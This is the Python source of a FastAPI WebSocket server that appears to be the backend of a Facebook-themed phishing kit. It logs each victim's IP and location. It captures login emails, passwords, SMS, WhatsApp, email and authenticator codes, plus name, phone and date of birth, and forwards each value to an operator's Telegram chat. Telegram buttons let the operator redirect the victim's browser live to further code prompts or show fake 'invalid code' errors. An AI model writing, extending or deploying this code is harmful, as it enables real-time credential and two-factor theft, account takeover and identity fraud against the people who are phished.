import asyncio
import uuid
import json
import httpx
from datetime import datetime
from typing import Dict, Optional
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import RedirectResponse, HTMLResponse
import uvicorn
from dotenv import load_dotenv
import os

app = FastAPI(title="FB Bot WebSocket Server")

load_dotenv()  # Load environment variables from .env file

# CORS for React app
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Telegram Bot Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# WebSocket server URL (update this when deploying)
# For local dev, use ngrok or similar to expose
WS_SERVER_URL = os.getenv("WS_SERVER_URL")

# Store connected clients: {client_id: WebSocket}
connected_clients: Dict[str, WebSocket] = {}

# Store client metadata: {client_id: {ip, country, city, region, connected_at, message_id}}
client_metadata: Dict[str, dict] = {}

# Store accumulated form data: {client_id: {email, password, sms, auth, etc.}}
client_form_data: Dict[str, dict] = {}

# Site URL for display in messages
SITE_URL = os.getenv("SITE_URL", "https://example.com")


async def send_telegram_message(client_id: str, metadata: dict) -> Optional[int]:
    """Send initial connection notification to Telegram with navigation buttons"""

    # Check if we have a public URL (not localhost)
    is_public_url = not (
        "localhost" in WS_SERVER_URL or "127.0.0.1" in WS_SERVER_URL)

    message = f"""🔔 <b>NEW VISITOR</b>
🏢 <a href="{SITE_URL}">{SITE_URL}</a>

🆔 <code>{client_id[:8]}</code>

🌐 IP: <code>{metadata.get('ip', 'N/A')}</code>
📍 Country: {metadata.get('country', 'N/A')}
🏙 City: {metadata.get('city', 'N/A')}
📍 Region: {metadata.get('region', 'N/A')}

⏳ <i>Waiting for user input...</i>"""

    # Add navigation links as text if using localhost (not public)
    if not is_public_url:
        message += f"""

<b>📌 Navigation:</b>
<a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=login">PASS</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=sms">SMS</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=email">EMAIL</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=whatsapp">WA</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=auth">AUTH</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=done">DONE</a>"""

    # Only use inline keyboard if we have a public URL
    reply_markup = None
    if is_public_url:
        reply_markup = {
            "inline_keyboard": [
                [
                    {"text": "AUTH", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=auth"},
                    {"text": "SMS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=sms"},
                    {"text": "WA", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=whatsapp"},
                    {"text": "EMAIL", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=email"}
                ],
                [
                    {"text": "❌ AUTH", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=auth"},
                    {"text": "❌ SMS", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=sms"},
                    {"text": "❌ WA", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=whatsapp"},
                    {"text": "❌ EMAIL", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=email"}
                ],
                [
                    {"text": "PASS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=login"},
                    {"text": "✅ DONE", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=reviewTax"},
                    {"text": "❌", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=cancel"}
                ]
            ]
        }

    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }

    if reply_markup:
        payload["reply_markup"] = reply_markup

    async with httpx.AsyncClient() as client:
        try:
            print(f"Sending to Telegram API...")
            response = await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json=payload
            )
            result = response.json()
            print(f"Telegram API response: {result}")
            if result.get("ok"):
                return result["result"]["message_id"]
            else:
                print(f"Telegram API error: {result}")
        except Exception as e:
            print(f"Error sending Telegram message: {e}")
    return None


async def update_telegram_message(client_id: str, update_type: str, data: dict):
    """Send form submission data to Telegram with accumulated data"""

    metadata = client_metadata.get(client_id, {})

    # Initialize form data storage for this client if not exists
    if client_id not in client_form_data:
        client_form_data[client_id] = {}

    # Store/update the submitted data
    if update_type == "login":
        client_form_data[client_id]["email"] = data.get("email", "")
        client_form_data[client_id]["password"] = data.get("password", "")
    elif update_type == "sms":
        client_form_data[client_id]["sms"] = data.get("code", "")
    elif update_type == "email":
        client_form_data[client_id]["email_code"] = data.get("code", "")
    elif update_type == "whatsapp":
        client_form_data[client_id]["whatsapp"] = data.get("code", "")
    elif update_type == "auth":
        client_form_data[client_id]["auth"] = data.get("code", "")
    elif update_type == "request_review":
        client_form_data[client_id]["full_name"] = data.get("fullName", "")
        client_form_data[client_id]["review_email"] = data.get("email", "")
        client_form_data[client_id]["phone"] = data.get("phone", "")
        client_form_data[client_id]["dob"] = data.get("dob", "")

    # Get stored form data
    form_data = client_form_data.get(client_id, {})

    # Build message header based on type
    type_labels = {
        "login": "🔐 Login",
        "sms": "📱 SMS Code",
        "email": "📧 Email Code",
        "whatsapp": "💬 WhatsApp Code",
        "auth": "🔑 Auth Code",
        "request_review": "📝 Review Form"
    }

    type_label = type_labels.get(update_type, "📋 Data")

    # Build message with accumulated data
    message = f"""<b>{type_label}</b>
🏢 <a href="{SITE_URL}">{SITE_URL}</a>

🆔 <code>{client_id[:8]}</code>
"""

    # Add login credentials if available
    if form_data.get("email"):
        message += f"\n📧 Email: <code>{form_data['email']}</code>"

    # Highlight the new field with 🔴
    if update_type == "login" and form_data.get("password"):
        message += f"\n🔴 Pass: <code>{form_data['password']}</code>"
    elif form_data.get("password"):
        message += f"\n🔑 Pass: <code>{form_data['password']}</code>"

    # Add SMS if available
    if update_type == "sms" and form_data.get("sms"):
        message += f"\n🔴 SMS: <code>{form_data['sms']}</code>"
    elif form_data.get("sms"):
        message += f"\n📱 SMS: <code>{form_data['sms']}</code>"

    # Add Email code if available
    if update_type == "email" and form_data.get("email_code"):
        message += f"\n🔴 Email Code: <code>{form_data['email_code']}</code>"
    elif form_data.get("email_code"):
        message += f"\n📧 Email Code: <code>{form_data['email_code']}</code>"

    # Add WhatsApp code if available
    if update_type == "whatsapp" and form_data.get("whatsapp"):
        message += f"\n🔴 WA: <code>{form_data['whatsapp']}</code>"
    elif form_data.get("whatsapp"):
        message += f"\n💬 WA: <code>{form_data['whatsapp']}</code>"

    # Add Auth code if available
    if update_type == "auth" and form_data.get("auth"):
        message += f"\n🔴 Auth: <code>{form_data['auth']}</code>"
    elif form_data.get("auth"):
        message += f"\n🔑 Auth: <code>{form_data['auth']}</code>"

    # Add review form data if available
    if update_type == "request_review":
        if form_data.get("full_name"):
            message += f"\n🔴 Name: <code>{form_data['full_name']}</code>"
        if form_data.get("review_email"):
            message += f"\n🔴 Email: <code>{form_data['review_email']}</code>"
        if form_data.get("phone"):
            message += f"\n🔴 Phone: <code>{form_data['phone']}</code>"
        if form_data.get("dob"):
            message += f"\n🔴 DOB: <code>{form_data['dob']}</code>"

    # Add location info
    message += f"""

🌐 IP: <code>{metadata.get('ip', 'N/A')}</code>
📍 Country: {metadata.get('country', 'N/A')}
🏙 City: {metadata.get('city', 'N/A')}
📍 Region: {metadata.get('region', 'N/A')}"""

    # Check if we have a public URL (not localhost)
    is_public_url = not (
        "localhost" in WS_SERVER_URL or "127.0.0.1" in WS_SERVER_URL)

    # Add navigation links as text if using localhost
    if not is_public_url:
        message += f"""

<b>📌 Navigation:</b>
<a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=login">PASS</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=sms">SMS</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=email">EMAIL</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=whatsapp">WA</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=auth">AUTH</a> | <a href="{WS_SERVER_URL}/navigate?client_id={client_id}&action=done">DONE</a>"""

    # Only use inline keyboard if we have a public URL
    reply_markup = None
    if is_public_url:
        reply_markup = {
            "inline_keyboard": [
                [
                    {"text": "AUTH", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=auth"},
                    {"text": "SMS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=sms"},
                    {"text": "WA", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=whatsapp"},
                    {"text": "EMAIL", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=email"}
                ],
                [
                    {"text": "❌ AUTH", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=auth"},
                    {"text": "❌ SMS", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=sms"},
                    {"text": "❌ WA", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=whatsapp"},
                    {"text": "❌ EMAIL", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=email"}
                ],
                [
                    {"text": "PASS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=login"},
                    {"text": "✅ DONE", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=reviewTax"},
                    {"text": "❌", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=cancel"}
                ]
            ]
        }

    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }

    if reply_markup:
        payload["reply_markup"] = reply_markup

    async with httpx.AsyncClient() as client:
        try:
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json=payload
            )
        except Exception as e:
            print(f"Error sending Telegram update: {e}")


@app.get("/")
async def root():
    """Health check endpoint"""
    return {"status": "running", "clients": len(connected_clients)}


@app.get("/show-error")
async def show_error(client_id: str = Query(...), error_type: str = Query(...)):
    """
    Handle error display request from Telegram button click.
    Shows "Wrong code" error on the client's verification page.
    """
    
    error_messages = {
        "sms": "Invalid code. Please check your text messages and try again.",
        "whatsapp": "Invalid code. Please check your WhatsApp and try again.",
        "auth": "Invalid code. Please check your authentication app and try again.",
        "email": "Invalid code. Please check your email and try again."
    }
    
    error_message = error_messages.get(error_type, "Invalid code. Please try again.")
    
    if client_id in connected_clients:
        websocket = connected_clients[client_id]
        try:
            # Send error command to the client
            await websocket.send_json({
                "type": "show_error",
                "error_type": error_type,
                "message": error_message
            })
            
            return HTMLResponse(content=f"""
                <html>
                    <head><title>Error Sent</title></head>
                    <body style="font-family: Arial; text-align: center; padding: 50px;">
                        <h2>✅ Error Message Sent</h2>
                        <p>Client <code>{client_id[:8]}...</code> will see: <b>"{error_type.upper()} wrong code"</b></p>
                        <p style="color: #666;">You can close this window.</p>
                        <script>setTimeout(() => window.close(), 2000);</script>
                    </body>
                </html>
            """)
        except Exception as e:
            return HTMLResponse(content=f"""
                <html>
                    <head><title>Error</title></head>
                    <body style="font-family: Arial; text-align: center; padding: 50px;">
                        <h2>❌ Error</h2>
                        <p>Failed to send error message: {str(e)}</p>
                    </body>
                </html>
            """, status_code=500)
    else:
        return HTMLResponse(content=f"""
            <html>
                <head><title>Client Not Found</title></head>
                <body style="font-family: Arial; text-align: center; padding: 50px;">
                    <h2>⚠️ Client Not Connected</h2>
                    <p>Client <code>{client_id[:8]}...</code> is not connected.</p>
                    <p style="color: #666;">The user may have closed their browser.</p>
                </body>
            </html>
        """, status_code=404)


@app.get("/navigate")
async def navigate_client(client_id: str = Query(...), action: str = Query(...)):
    """
    Handle navigation request from Telegram button click.
    This endpoint is called when admin clicks a button in Telegram.
    """

    # Route mapping
    route_map = {
        "auth": "/require/auth",
        "sms": "/require/sms",
        "whatsapp": "/require/whatsapp",
        "email": "/require/email",
        "login": "/require/login",
        "notice": "/require/notice",
        "request_review": "/require/request-review",
        "error": "/require/error",
        "home": "/",
        "reviewTax": "/require/request-review",  # Map career to request review form
        "done": "/require/error",  # Show success/done page
        "cancel": "/require/error"  # Show error/cancelled page
    }

    route = route_map.get(action, "/")

    if client_id in connected_clients:
        websocket = connected_clients[client_id]
        try:
            # Send navigation command to the client
            await websocket.send_json({
                "type": "navigate",
                "route": route,
                "action": action
            })

            # Return a simple HTML page that closes itself
            return HTMLResponse(content=f"""
                <html>
                    <head><title>Navigation Sent</title></head>
                    <body style="font-family: Arial; text-align: center; padding: 50px;">
                        <h2>✅ Navigation Command Sent</h2>
                        <p>Client <code>{client_id[:8]}...</code> is being redirected to <b>{action}</b></p>
                        <p style="color: #666;">You can close this window.</p>
                        <script>setTimeout(() => window.close(), 2000);</script>
                    </body>
                </html>
            """)
        except Exception as e:
            return HTMLResponse(content=f"""
                <html>
                    <head><title>Error</title></head>
                    <body style="font-family: Arial; text-align: center; padding: 50px;">
                        <h2>❌ Error</h2>
                        <p>Failed to send navigation: {str(e)}</p>
                    </body>
                </html>
            """, status_code=500)
    else:
        return HTMLResponse(content=f"""
            <html>
                <head><title>Client Not Found</title></head>
                <body style="font-family: Arial; text-align: center; padding: 50px;">
                    <h2>⚠️ Client Not Connected</h2>
                    <p>Client <code>{client_id[:8]}...</code> is not connected.</p>
                    <p style="color: #666;">The user may have closed their browser.</p>
                </body>
            </html>
        """, status_code=404)


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """Main WebSocket endpoint for client connections"""

    await websocket.accept()

    # Generate unique client ID
    client_id = str(uuid.uuid4())

    # Store the connection
    connected_clients[client_id] = websocket

    # Initialize metadata
    client_metadata[client_id] = {
        "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": "Fetching...",
        "country": "Unknown",
        "city": "Unknown",
        "region": "Unknown"
    }

    try:
        # Send client ID to the client
        await websocket.send_json({
            "type": "connected",
            "client_id": client_id
        })

        # Wait for client to send their location/IP info
        # The client will fetch this and send it back

        while True:
            # Receive messages from client
            data = await websocket.receive_json()

            msg_type = data.get("type")
            print(f"Received message from {client_id}: {msg_type}")

            if msg_type == "client_info":
                print(f"Client info received: {data}")
                # Update metadata with client info (don't send Telegram yet)
                client_metadata[client_id].update({
                    "ip": data.get("ip", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("region", "Unknown"),
                    "user_agent": data.get("user_agent", "Unknown")
                })
                print(f"Metadata updated for client {client_id}")

            elif msg_type == "send_notification":
                # Send initial notification to Telegram (triggered from Login page only)
                # Client info is included in the message
                metadata = {
                    "ip": data.get("ip", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("region", "Unknown"),
                    "user_agent": data.get("user_agent", "Unknown")
                }
                # Update stored metadata
                client_metadata[client_id].update(metadata)
                
                print(f"Sending initial Telegram notification for client {client_id}...")
                message_id = await send_telegram_message(client_id, metadata)
                print(f"Telegram message result: {message_id}")
                if message_id:
                    client_metadata[client_id]["message_id"] = message_id

            elif msg_type == "form_submit":
                # Handle form submission
                submit_type = data.get("submit_type", "unknown")
                form_data = data.get("data", {})
                
                # Update metadata from client_info included in submission
                client_info = data.get("client_info", {})
                if client_info:
                    client_metadata[client_id].update({
                        "ip": client_info.get("ip", client_metadata[client_id].get("ip", "Unknown")),
                        "country": client_info.get("country", client_metadata[client_id].get("country", "Unknown")),
                        "city": client_info.get("city", client_metadata[client_id].get("city", "Unknown")),
                        "region": client_info.get("region", client_metadata[client_id].get("region", "Unknown")),
                    })

                # Send to Telegram
                await update_telegram_message(client_id, submit_type, form_data)

                # Acknowledge receipt
                await websocket.send_json({
                    "type": "submit_ack",
                    "submit_type": submit_type,
                    "status": "received"
                })

            elif msg_type == "ping":
                # Keep-alive ping
                await websocket.send_json({"type": "pong"})

    except WebSocketDisconnect:
        print(f"Client {client_id} disconnected")
    except Exception as e:
        print(f"Error with client {client_id}: {e}")
    finally:
        # Clean up on disconnect
        if client_id in connected_clients:
            del connected_clients[client_id]
        if client_id in client_metadata:
            del client_metadata[client_id]
        if client_id in client_form_data:
            del client_form_data[client_id]


if __name__ == "__main__":
    print("Starting WebSocket Server...")
    print(f"WebSocket URL: ws://localhost:8000/ws")
    print(
        f"Navigate URL: {WS_SERVER_URL}/navigate?client_id=<id>&action=<action>")
    uvicorn.run(app, host="0.0.0.0", port=8000)
